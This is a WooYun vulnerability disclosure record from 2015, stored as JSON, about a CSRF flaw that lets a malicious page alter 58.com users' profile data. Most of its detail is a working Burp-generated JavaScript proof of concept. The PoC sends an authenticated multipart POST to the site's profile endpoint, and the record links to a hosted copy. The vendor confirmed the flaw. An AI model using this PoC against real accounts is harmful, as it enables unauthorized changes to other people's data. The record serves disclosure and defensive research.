{"id": 69497, "wybug_id": "wooyun-2015-0136770", "wybug_title": "58同城存在csrf可修改用户个人信息", "wybug_corp": "58同城", "wybug_author": "番茄师傅", "wybug_date": "2015-09-01 15:38", "wybug_open_date": "2015-10-17 16:58", "wybug_type": "CSRF", "wybug_level": "中", "wybug_rank_0": "8", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["漏洞利用", "利用"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-09-01：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-09-02：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-09-12：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-09-22：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-10-02：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-10-17：\t细节向公众公开  简要描述： 58同城存在csrf可修改用户个人信息 详细说明：  修改个人信息处没有加token，也未验证refer 导致csrf\n\n构造poc\npoc地址 http://xss.gift/58csrf.html\n \n<html>  <!-- CSRF PoC - generated by Burp Suite Professional -->  <body>    <script>      function submitRequest()      {        var xhr = new XMLHttpRequest();        xhr.open(\"POST\", \"http://my.58.com/submit/userdata/?sys=my\", true);        xhr.setRequestHeader(\"Accept\", \"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\");        xhr.setRequestHeader(\"Content-Type\", \"multipart/form-data; boundary=----WebKitFormBoundaryALghzlG7Rbu5ZzZ6\");        xhr.setRequestHeader(\"Accept-Language\", \"zh-CN,zh;q=0.8\");        xhr.withCredentials = true;        var body = \"------WebKitFormBoundaryALghzlG7Rbu5ZzZ6\\r\\n\" +           \"Content-Disposition: form-data; name=\\\"fileUploadInput\\\"; filename=\\\"\\\"\\r\\n\" +           \"Content-Type: application/octet-stream\\r\\n\" +           \"\\r\\n\" +           \"\\r\\n\" +           \"------WebKitFormBoundaryALghzlG7Rbu5ZzZ6\\r\\n\" +           \"Content-Disposition: form-data; name=\\\"backFunction\\\"\\r\\n\" +           \"\\r\\n\" +           \"uploadresult\\r\\n\" +           \"------WebKitFormBoundaryALghzlG7Rbu5ZzZ6\\r\\n\" +           \"Content-Disposition: form-data; name=\\\"txtPhone\\\"\\r\\n\" +           \"\\r\\n\" +           \"\\r\\n\" +           \"------WebKitFormBoundaryALghzlG7Rbu5ZzZ6\\r\\n\" +           \"Content-Disposition: form-data; name=\\\"txtQQ\\\"\\r\\n\" +           \"\\r\\n\" +           \"\\r\\n\" +           \"------WebKitFormBoundaryALghzlG7Rbu5ZzZ6\\r\\n\" +           \"Content-Disposition: form-data; name=\\\"txtTrueName\\\"\\r\\n\" +           \"\\r\\n\" +           \"\\xe9\\x99\\x88\\xe9\\xa3\\x9e\\r\\n\" +           \"------WebKitFormBoundaryALghzlG7Rbu5ZzZ6\\r\\n\" +           \"Content-Disposition: form-data; name=\\\"rbsex\\\"\\r\\n\" +           \"\\r\\n\" +           \"1\\r\\n\" +           \"------WebKitFormBoundaryALghzlG7Rbu5ZzZ6\\r\\n\" +           \"Content-Disposition: form-data; name=\\\"yeardate1\\\"\\r\\n\" +           \"\\r\\n\" +           \"1980\\r\\n\" +           \"------WebKitFormBoundaryALghzlG7Rbu5ZzZ6\\r\\n\" +           \"Content-Disposition: form-data; name=\\\"monthdate1\\\"\\r\\n\" +           \"\\r\\n\" +           \"1\\r\\n\" +           \"------WebKitFormBoundaryALghzlG7Rbu5ZzZ6\\r\\n\" +           \"Content-Disposition: form-data; name=\\\"daydate1\\\"\\r\\n\" +           \"\\r\\n\" +           \"1\\r\\n\" +           \"------WebKitFormBoundaryALghzlG7Rbu5ZzZ6\\r\\n\" +           \"Content-Disposition: form-data; name=\\\"select_citylocal1\\\"\\r\\n\" +           \"\\r\\n\" +           \"222\\r\\n\" +           \"------WebKitFormBoundaryALghzlG7Rbu5ZzZ6\\r\\n\" +           \"Content-Disposition: form-data; name=\\\"select_arealocal1\\\"\\r\\n\" +           \"\\r\\n\" +           \"224\\r\\n\" +           \"------WebKitFormBoundaryALghzlG7Rbu5ZzZ6\\r\\n\" +           \"Content-Disposition: form-data; name=\\\"select_namelocal1\\\"\\r\\n\" +           \"\\r\\n\" +           \"5186\\r\\n\" +           \"------WebKitFormBoundaryALghzlG7Rbu5ZzZ6\\r\\n\" +           \"Content-Disposition: form-data; name=\\\"txtAreola\\\"\\r\\n\" +           \"\\r\\n\" +           \"\\xe9\\x99\\x88\\r\\n\" +           \"------WebKitFormBoundaryALghzlG7Rbu5ZzZ6\\r\\n\" +           \"Content-Disposition: form-data; name=\\\"txtAddress\\\"\\r\\n\" +           \"\\r\\n\" +           \"\\r\\n\" +           \"------WebKitFormBoundaryALghzlG7Rbu5ZzZ6\\r\\n\" +           \"Content-Disposition: form-data; name=\\\"txtPostZip\\\"\\r\\n\" +           \"\\r\\n\" +           \"\\r\\n\" +           \"------WebKitFormBoundaryALghzlG7Rbu5ZzZ6\\r\\n\" +           \"Content-Disposition: form-data; name=\\\"txtManse\\\"\\r\\n\" +           \"\\r\\n\" +           \"\\r\\n\" +           \"------WebKitFormBoundaryALghzlG7Rbu5ZzZ6\\r\\n\" +           \"Content-Disposition: form-data; name=\\\"hometown\\\"\\r\\n\" +           \"\\r\\n\" +           \"1\\r\\n\" +           \"------WebKitFormBoundaryALghzlG7Rbu5ZzZ6\\r\\n\" +           \"Content-Disposition: form-data; name=\\\"txtSignContent\\\"\\r\\n\" +           \"\\r\\n\" +           \"777777777777777777777777777\\r\\n\" +           \"------WebKitFormBoundaryALghzlG7Rbu5ZzZ6--\\r\\n\";        var aBody = new Uint8Array(body.length);        for (var i = 0; i < aBody.length; i++)          aBody[i] = body.charCodeAt(i);         xhr.send(new Blob([aBody]));      }    </script>    <form action=\"#\">      <input type=\"button\" value=\"Submit request\" onclick=\"submitRequest();\" />    </form>  </body></html>\n\npoc地址 http://xss.gift/58csrf.html\n 访问前 ：\n\n访问后 \n\n   漏洞证明：  \npoc地址 http://xss.gift/58csrf.html\n 访问前 ：\n\n访问后 \n\n   修复方案：  你们有司马大牛据说加一句给司马大牛加薪会有高rank和礼物 是吗？   版权声明：转载请注明来源 番茄师傅@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2015-09-02 16:57 厂商回复： 感谢提交，会尽快修复处理！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}